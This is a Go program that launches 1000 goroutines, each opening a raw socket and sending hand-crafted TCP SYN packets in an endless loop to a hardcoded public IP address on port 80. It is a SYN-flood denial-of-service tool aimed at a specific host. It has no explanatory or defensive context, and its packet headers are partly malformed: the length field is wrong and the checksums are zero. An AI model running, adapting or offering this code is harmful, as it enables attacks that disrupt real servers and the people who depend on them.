package main

import (
	"log"
	"syscall"
	"time"
	"net"
	"encoding/binary"
)

// Number of goroutines
var numGoroutines = 1000

// Destination IP address
var destIP = net.ParseIP("108.171.216.122").To4()

// Destination port
var destPort = 80

func sendPacket() {
	// Create a raw socket
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
	if err != nil {
		log.Fatal(err)
	}

	// Set IP header fields
	ipHeader := []byte{
		0x45,       // Version (4) + Internet header length (5)
		0x00,       // Type of service 
		0x00, 0x14, // Total length 
		0x00, 0x00, // Identification
		0x00, 0x00, // Flags + fragment offset
		0x40,       // Time to live
		0x06,       // Protocol number (TCP)
		0x00, 0x00, // Header checksum
		0x7f, 0x00, 0x00, 0x01, // Source address
		destIP[0], destIP[1], destIP[2], destIP[3], // Destination address
	}

	// Convert the destination port to a byte slice
	destPortBytes := make([]byte, 2)
	binary.BigEndian.PutUint16(destPortBytes, uint16(destPort))

	// Set TCP header fields
	tcpHeader := []byte{
		0x00, 0x50, // Source port
		destPortBytes[0], destPortBytes[1], // Destination port
		0x00, 0x00, 0x00, 0x00, // Sequence number
		0x00, 0x00, 0x00, 0x00, // Acknowledgment number
		0x50, 0x02, // Data offset, reserved, flags
		0x71, 0x10, // Window size
		0x00, 0x00, // Checksum
		0x00, 0x00, // Urgent pointer
	}

	for {
		// Send the SYN packet
		if err := syscall.Sendto(fd, append(ipHeader, tcpHeader...), 0, &syscall.SockaddrInet4{
			Port: 0,
			Addr: [4]byte{destIP[0], destIP[1], destIP[2], destIP[3]}, // IP address
		}); err != nil {
			log.Fatal(err)
		}
		time.Sleep(1 * time.Second)
	}
}

func main() {
	for i := 0; i < numGoroutines; i++ {
		go sendPacket()
	}
	select {}
}
